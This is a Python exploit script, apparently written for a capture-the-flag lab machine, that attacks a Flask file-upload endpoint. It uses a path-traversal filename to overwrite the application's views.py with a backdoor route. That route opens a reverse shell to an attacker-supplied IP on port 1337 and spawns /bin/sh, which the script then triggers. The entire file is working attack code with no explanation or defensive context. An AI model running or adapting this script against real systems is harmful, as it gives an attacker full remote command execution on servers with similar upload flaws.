import requests 
import argparse
import traceback

def uploadBackdoor():
    url = "http://10.10.11.164:80/upcloud"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=----geckoformboundaryccb8ffc6c34caff1c0a77bcda2c571b", "Origin": "http://10.10.11.164", "Connection": "close", "Referer": "http://10.10.11.164/upcloud", "Upgrade-Insecure-Requests": "1", "Priority": "u=0, i"}
    data = "------geckoformboundaryccb8ffc6c34caff1c0a77bcda2c571b\r\nContent-Disposition: form-data; name=\"file\"; filename=\"/app/app/views.py\"\r\nContent-Type: text/x-python\r\n\r\nimport os\r\n\r\nfrom app.utils import get_file_name\r\nfrom flask import render_template, request, send_file\r\n\r\nfrom app import app\r\n\r\n\r\n@app.route('/')\r\ndef index():\r\n    return render_template('index.html')\r\n\r\n\r\n@app.route('/download')\r\ndef download():\r\n    return send_file(os.path.join(os.getcwd(), \"app\", \"static\", \"source.zip\"))\r\n\r\n\r\n@app.route('/upcloud', methods=['GET', 'POST'])\r\ndef upload_file():\r\n    if request.method == 'POST':\r\n        f = request.files['file']\r\n        file_name = get_file_name(f.filename)\r\n        file_path = os.path.join(os.getcwd(), \"public\", \"uploads\", file_name)\r\n        f.save(file_path)\r\n        return render_template('success.html', file_url=request.host_url + \"uploads/\" + file_name)\r\n    return render_template('upload.html')\r\n\r\n\r\n@app.route('/uploads/<path:path>')\r\ndef send_report(path):\r\n    path = get_file_name(path)\r\n    return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path))\r\n\r\n\r\n@app.route('/revshell/<ip>')\r\ndef reverse_shell(ip):\r\n    import socket,os,pty\r\n    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\r\n    s.connect((ip,1337))\r\n    os.dup2(s.fileno(),0) \r\n    os.dup2(s.fileno(),1)\r\n    os.dup2(s.fileno(),2)\r\n    pty.spawn(\"/bin/sh\")\r\n\r\n------geckoformboundaryccb8ffc6c34caff1c0a77bcda2c571b--\r\n"
    try:
        print("[*] Uploading the backdoor...")
        requests.post(url, headers=headers, data=data)
        print("[+] Uploaded successfully!")
        return True
    except Exception as e:
        print("[-] Error uploading the backdoor: ", e)
        traceback.print_exc()
        return False

def triggerRevShell(lhost):
    url = f"http://10.10.11.164:80/revshell/{lhost}"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Priority": "u=0, i"}
    try:
        print("[*] Triggering the revese shell. Please check your listener on port 1337")
        requests.get(url, headers=headers)
    except Exception as e:
        print("[-] Failed to trigger the revese shell: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser("Get an RCE via uploading a backdoor to the target's machine")
    parser.add_argument("lhost", help="Listener IP address")
    args = parser.parse_args()
    
    if uploadBackdoor():
        triggerRevShell(args.lhost)

if __name__ == "__main__":
    main()
